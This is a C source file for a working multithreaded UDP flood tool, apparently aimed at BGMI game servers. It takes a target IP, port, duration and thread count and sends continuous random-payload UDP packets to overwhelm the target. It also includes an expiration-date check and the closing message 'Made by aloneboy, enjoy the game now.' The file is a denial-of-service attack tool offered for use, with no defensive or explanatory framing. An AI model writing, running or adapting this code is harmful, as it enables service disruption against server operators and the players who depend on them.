#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>

#define PAYLOAD_SIZE 20

// Expiration date (YYYY-MM-DD)
#define EXPIRATION_DATE "2025-01-26"

// Global variable to stop attack gracefully
volatile int stop_attack = 0;

// Function to check expiration date
void check_expiration() {
    struct tm expiration_tm = {0};
    time_t current_time;
    time_t expiration_time;

    // Parse expiration date
    strptime(EXPIRATION_DATE, "%Y-%m-%d", &expiration_tm);
    expiration_time = mktime(&expiration_tm);
    current_time = time(NULL);

    // Compare current date with expiration date
    if (current_time > expiration_time) {
        printf("This program has expired. Please contact the developer.\n");
        exit(1);
    }
}

// Function to generate random payload
void generate_payload(char *buffer, size_t size) {
    const char *hex_chars = "0123456789abcdef";
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = hex_chars[rand() % 16];
        buffer[i * 4 + 3] = hex_chars[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

// Function to handle attack for each thread
void *attack_thread(void *arg) {
    char **params = (char **)arg;
    const char *ip = params[0];
    int port = atoi(params[1]);
    int duration = atoi(params[2]);

    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[PAYLOAD_SIZE * 4 + 1];
    generate_payload(payload, PAYLOAD_SIZE);

    // Create UDP socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    endtime = time(NULL) + duration;

    while (time(NULL) <= endtime && !stop_attack) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, 
                   (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            close(sock);
            pthread_exit(NULL);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// Signal handler for graceful exit
void handle_sigint(int sig) {
    printf("\nStopping attack...\n");
    stop_attack = 1;
}

// Function to display usage instructions
void usage() {
    printf("Usage: ./bgmi <ip> <port> <duration> <threads>\n");
    exit(1);
}

int main(int argc, char *argv[]) {
    // Check expiration date
    check_expiration();

    if (argc != 5) {
        usage();
    }

    const char *ip = argv[1];
    const char *port = argv[2];
    const char *duration = argv[3];
    int threads = atoi(argv[4]);

    // Seed random number generator
    srand(time(NULL));

    // Set up signal handler
    signal(SIGINT, handle_sigint);

    pthread_t thread_ids[threads];
    char *params[] = {(char *)ip, (char *)port, (char *)duration};

    printf("Attack started on %s:%s for %s seconds with %d threads\n", ip, port, duration, threads);

    // Launch threads
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack_thread, (void *)params) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        printf("Launched thread with ID: %lu\n", thread_ids[i]);
    }

    // Wait for threads to finish
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    printf("Attack finished. Made by aloneboy, enjoy the game now.\n");
    return 0;
}
